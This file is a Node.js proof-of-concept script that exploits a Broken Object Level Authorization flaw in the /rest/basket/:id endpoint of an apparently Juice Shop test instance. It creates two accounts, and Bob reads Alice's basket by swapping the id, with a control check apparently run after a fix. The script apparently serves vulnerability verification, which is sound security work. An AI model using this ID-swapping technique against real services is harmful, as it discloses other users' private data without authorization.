#!/usr/bin/env node
/*
 * V4 - Broken Object Level Authorization on /rest/basket/:id
 *       (CWE-639, OWASP API Security Top 10 - API1:2023 BOLA)
 *
 * routes/basket.ts looked up any basket by its id. The route mounted
 * security.isAuthorized(), so it proved the caller held *a* valid JWT, but it
 * never checked that the basket belonged to that caller. Changing the id in the
 * path therefore disclosed another customer's basket (products, quantities).
 *
 * Run:  node poc/04-bola-basket.mjs --url http://localhost:3000
 */

import { ARGS, request, login, registerUser, verdict } from './lib/util.mjs'

const ALICE = { email: 'alice@juice-sh.op', password: 'AliceDemo123!' }
const BOB = { email: 'bob@juice-sh.op', password: 'BobDemo123!' }

const evidence = []

async function createUserWithBasket (user) {
  await registerUser(user.email, user.password)
  const session = await login(user.email, user.password)
  if (!session) return null
  // Put something distinctive into the basket so we can recognise it later.
  // BasketId must be supplied explicitly or the row is saved with a NULL basket.
  await request('/api/BasketItems', {
    method: 'POST',
    json: true,
    headers: { Authorization: `Bearer ${session.token}` },
    body: JSON.stringify({ ProductId: 1, BasketId: session.bid, quantity: 3 })
  })
  await request('/api/BasketItems', {
    method: 'POST',
    json: true,
    headers: { Authorization: `Bearer ${session.token}` },
    body: JSON.stringify({ ProductId: 2, BasketId: session.bid, quantity: 7 })
  })
  return session
}

const alice = await createUserWithBasket(ALICE)
const bob = await createUserWithBasket(BOB)

if (!alice || !bob) {
  verdict({
    id: 'V4',
    title: 'Broken Object Level Authorization - basket',
    cwe: 'CWE-639',
    exploited: false,
    evidence: ['Could not create the two test accounts; aborting.']
  })
}

evidence.push(`Alice (victim)  basket id : ${alice.bid}`)
evidence.push(`Bob   (attacker) basket id : ${bob.bid}`)

// Alice reads her own basket - this must always work.
const own = await request(`/rest/basket/${alice.bid}`, { headers: { Authorization: `Bearer ${alice.token}` } })
evidence.push(`Alice GET /rest/basket/${alice.bid}      -> HTTP ${own.status} (own basket, ${own.json?.data?.Products?.length ?? 0} products)`)

// Bob now asks for Alice's basket.
const stolen = await request(`/rest/basket/${alice.bid}`, { headers: { Authorization: `Bearer ${bob.token}` } })

evidence.push(`Bob   GET /rest/basket/${alice.bid}      -> HTTP ${stolen.status}`)

const products = stolen.json?.data?.Products ?? []
evidence.push(`Bob saw ${products.length} product(s) belonging to Alice`)
for (const p of products.slice(0, 3)) {
  evidence.push(`   - ${p.name} x${p.BasketItem?.quantity}  (unit price ${p.price})`)
}
if (stolen.status === 200 && products.length === 0) {
  evidence.push(`   raw response: ${stolen.text.slice(0, 120)}`)
}

const exploited = stolen.status === 200 && products.length > 0

// Control: Bob can still read his own basket after the fix.
const control = await request(`/rest/basket/${bob.bid}`, { headers: { Authorization: `Bearer ${bob.token}` } })
evidence.push(`Control: Bob GET /rest/basket/${bob.bid}      -> HTTP ${control.status} (his own basket still readable)`)

verdict({
  id: 'V4',
  title: 'Broken Object Level Authorization - basket',
  cwe: 'CWE-639',
  exploited,
  evidence
})
